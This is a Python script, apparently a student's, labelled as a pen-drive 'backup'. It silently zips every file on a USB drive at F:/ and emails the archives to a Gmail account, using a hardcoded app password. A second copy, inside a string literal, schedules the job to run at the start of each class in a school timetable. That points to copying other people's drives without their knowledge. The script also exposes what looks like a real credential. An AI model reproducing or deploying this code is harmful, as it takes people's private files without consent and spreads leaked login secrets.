import smtplib
from pathlib import Path
from email.message import EmailMessage
import time
import os
from apscheduler.schedulers.blocking import BlockingScheduler
from datetime import datetime
import zipfile

os.chdir(os.path.dirname(os.path.abspath(__file__)))

AULAS_3_I = {
    "segunda-feira": ["Biologia 2", "Biologia 2", "Física 2", "Física 2", "Matemática 1", "Matemática 1", "Itinerário", "Itinerário", "Itinerário", "Itinerário"],
    "terça-feira": ["Gramática", "BP", "Matemática 2", "Geografia 2", "Química 2", "Química 2", "Inglês", "Física 1"],
    "quarta-feira": ["Física 1", "Física 1", "Biologia 1", "Biologia 1", "Produção de Textos", "Educação Física", "Química 1", "Química 1"],
    "quinta-feira": ["Literatura", "Geografia 1", "BP", "História", "Química 1", "Matemática 2", "Produção de Textos", "Matemática 3"],
    "sexta-feira": ["Geografia 1", "Literatura", "História", "Gramática", "Biologia 3", "História"]
}

CRONOGRAMA = {
    "aulas": AULAS_3_I, 
    "tempos": {"tempo_de_aula": 45 * 60, "tempo_de_intervalo_1": 30 * 60, "tempo_de_intervalo_2": 40 * 60, "tempo_de_intervalo_3": 20 * 60}, 
    "horários": {"início": 7 * 60 * 60 + 10 * 60, "fim2": 16 * 60 * 60 + 10 * 60, "fim345": 14 * 60 * 60 + 20 * 60, "fim6": 12 * 60 * 60 + 10 * 60},
    "intervalos": {"primeiro23456": 9 * 60 * 60 + 25 * 60, "segundo2345": 12 * 60 * 60 + 10 * 60, "terceiro": 14 * 60 * 60 + 20 * 60}
    }

EMAIL = "skibidiohiorizzkaicenatgyatt@gmail.com"
SENHA_APP = "jwtwhfdkjwarclew"
DESTINO = "skibidiohiorizzkaicenatgyatt@gmail.com"

PEN_DRIVE = Path("F:/")
ZIP_NAME = Path("backup_usb.zip")
MAX_SIZE = 20 * 1024 * 1024
count = 0

scheduler = BlockingScheduler()

def make_zips(folder: Path, max_size=MAX_SIZE):
    zips = []
    current_zip_index = 1
    current_zip_files = []
    current_size = 0

    all_files = [f for f in folder.rglob("*") if f.is_file()]

    for file in all_files:
        file_size = file.stat().st_size

        if file_size > max_size:
            zip_path = Path(f"backup_part{current_zip_index}.zip")
            with zipfile.ZipFile(zip_path, "w") as zf:
                zf.write(file, arcname=file.name)
            zips.append(zip_path)
            current_zip_index += 1
            continue

        if current_size + file_size > max_size:
            zip_path = Path(f"backup_part{current_zip_index}.zip")
            with zipfile.ZipFile(zip_path, "w") as zf:
                for f in current_zip_files:
                    zf.write(f, arcname=f.relative_to(folder))
            zips.append(zip_path)
            current_zip_index += 1
            current_zip_files = []
            current_size = 0

        current_zip_files.append(file)
        current_size += file_size

    if current_zip_files:
        zip_path = Path(f"backup_part{current_zip_index}.zip")
        with zipfile.ZipFile(zip_path, "w") as zf:
            for f in current_zip_files:
                zf.write(f, arcname=f.relative_to(folder))
        zips.append(zip_path)

    return zips

def send_email(zip_paths):
    for zip_path in zip_paths:
        msg = EmailMessage()
        msg["From"] = EMAIL
        msg["To"] = DESTINO
        msg["Subject"] = f"Backup do Pen Drive - {zip_path.name}"
        msg.set_content("Segue em anexo o backup do pen drive.")

        with open(zip_path, "rb") as f:
            msg.add_attachment(
                f.read(),
                maintype="application",
                subtype="zip",
                filename=zip_path.name
            )

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL, SENHA_APP)
            server.send_message(msg)

        zip_path.unlink()

def saver():
    while True:
        if PEN_DRIVE.exists():
            zips = make_zips(PEN_DRIVE)
            send_email(zips)
            break
        else:
            if count == 5:
                break
            time.sleep(300)
            count += 1
    scheduler.shutdown(wait=False)

run_time = datetime(2026, 2, 15, 10, 16, 0)
scheduler.add_job(saver, 'date', run_date=run_time)
scheduler.start()

'''
import smtplib
from pathlib import Path
from email.message import EmailMessage
import time
import os
from apscheduler.schedulers.blocking import BlockingScheduler
from datetime import datetime
import zipfile

os.chdir(os.path.dirname(os.path.abspath(__file__)))

AULAS_3_I = {
    "segunda-feira": ["Biologia 2", "Biologia 2", "Física 2", "Física 2", "Matemática 1", "Matemática 1", "Itinerário", "Itinerário", "Itinerário", "Itinerário"],
    "terça-feira": ["Gramática", "BP", "Matemática 2", "Geografia 2", "Química 2", "Química 2", "Inglês", "Física 1"],
    "quarta-feira": ["Física 1", "Física 1", "Biologia 1", "Biologia 1", "Produção de Textos", "Educação Física", "Química 1", "Química 1"],
    "quinta-feira": ["Literatura", "Geografia 1", "BP", "História", "Química 1", "Matemática 2", "Produção de Textos", "Matemática 3"],
    "sexta-feira": ["Geografia 1", "Literatura", "História", "Gramática", "Biologia 3", "História"]
}

CRONOGRAMA = {
    "aulas": AULAS_3_I, 
    "tempos": {"tempo_de_aula": 45 * 60, "tempo_de_intervalo_1": 30 * 60, "tempo_de_intervalo_2": 40 * 60, "tempo_de_intervalo_3": 20 * 60}, 
    "horários": {"início": 7 * 60 * 60 + 10 * 60, "fim2": 16 * 60 * 60 + 10 * 60, "fim345": 14 * 60 * 60 + 20 * 60, "fim6": 12 * 60 * 60 + 10 * 60},
    "intervalos": {"primeiro23456": 9 * 60 * 60 + 25 * 60, "segundo2345": 12 * 60 * 60 + 10 * 60, "terceiro": 14 * 60 * 60 + 20 * 60}
    }

EMAIL = "skibidiohiorizzkaicenatgyatt@gmail.com"
SENHA_APP = "jwtwhfdkjwarclew"
DESTINO = "skibidiohiorizzkaicenatgyatt@gmail.com"

PEN_DRIVE = Path("F:/")
ZIP_NAME = Path("backup_usb.zip")
MAX_SIZE = 20 * 1024 * 1024
count = 0

scheduler = BlockingScheduler()

def make_zips(folder: Path, max_size=MAX_SIZE):
    zips = []
    current_zip_index = 1
    current_zip_files = []
    current_size = 0

    all_files = [f for f in folder.rglob("*") if f.is_file()]

    for file in all_files:
        file_size = file.stat().st_size

        if file_size > max_size:
            zip_path = Path(f"backup_part{current_zip_index}.zip")
            with zipfile.ZipFile(zip_path, "w") as zf:
                zf.write(file, arcname=file.name)
            zips.append(zip_path)
            current_zip_index += 1
            continue

        if current_size + file_size > max_size:
            zip_path = Path(f"backup_part{current_zip_index}.zip")
            with zipfile.ZipFile(zip_path, "w") as zf:
                for f in current_zip_files:
                    zf.write(f, arcname=f.relative_to(folder))
            zips.append(zip_path)
            current_zip_index += 1
            current_zip_files = []
            current_size = 0

        current_zip_files.append(file)
        current_size += file_size

    if current_zip_files:
        zip_path = Path(f"backup_part{current_zip_index}.zip")
        with zipfile.ZipFile(zip_path, "w") as zf:
            for f in current_zip_files:
                zf.write(f, arcname=f.relative_to(folder))
        zips.append(zip_path)

    return zips

def send_email(zip_paths):
    for zip_path in zip_paths:
        msg = EmailMessage()
        msg["From"] = EMAIL
        msg["To"] = DESTINO
        msg["Subject"] = f"Backup do Pen Drive - {zip_path.name}"
        msg.set_content("Segue em anexo o backup do pen drive.")

        with open(zip_path, "rb") as f:
            msg.add_attachment(
                f.read(),
                maintype="application",
                subtype="zip",
                filename=zip_path.name
            )

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL, SENHA_APP)
            server.send_message(msg)

        zip_path.unlink()

def saver():
    global count

    while True:
        if PEN_DRIVE.exists():
            zips = make_zips(PEN_DRIVE)
            send_email(zips)
            break
        else:
            if count == 5:
                break
            time.sleep(300)
            count += 1

def calcular_horarios():
    horarios_semana = {}

    inicio = CRONOGRAMA["horários"]["início"]
    duracao = CRONOGRAMA["tempos"]["tempo_de_aula"]

    intervalos = CRONOGRAMA["intervalos"]

    for dia, aulas in AULAS_3_I.items():

        horario_atual = inicio
        lista = []

        for i in range(len(aulas)):

            lista.append(horario_atual)

            horario_atual += duracao

            if horario_atual == intervalos["primeiro23456"]:
                horario_atual += CRONOGRAMA["tempos"]["tempo_de_intervalo_1"]

            elif horario_atual == intervalos["segundo2345"]:
                horario_atual += CRONOGRAMA["tempos"]["tempo_de_intervalo_2"]

            elif horario_atual == intervalos["terceiro"]:
                horario_atual += CRONOGRAMA["tempos"]["tempo_de_intervalo_3"]

        horarios_semana[dia] = lista

    return horarios_semana

def agendar_aulas():

    mapa = {
        "segunda-feira": "mon",
        "terça-feira": "tue",
        "quarta-feira": "wed",
        "quinta-feira": "thu",
        "sexta-feira": "fri"
    }

    horarios = calcular_horarios()

    for dia, lista in horarios.items():

        for horario in lista:

            hora = horario // 3600
            minuto = (horario % 3600) // 60

            scheduler.add_job(
                saver,
                trigger="cron",
                day_of_week=mapa[dia],
                hour=hora,
                minute=minuto
            )

agendar_aulas()

#run_time = datetime(2026, 2, 15, 10, 16, 0)
#scheduler.add_job(saver, 'date', run_date=run_time)
scheduler.start()
'''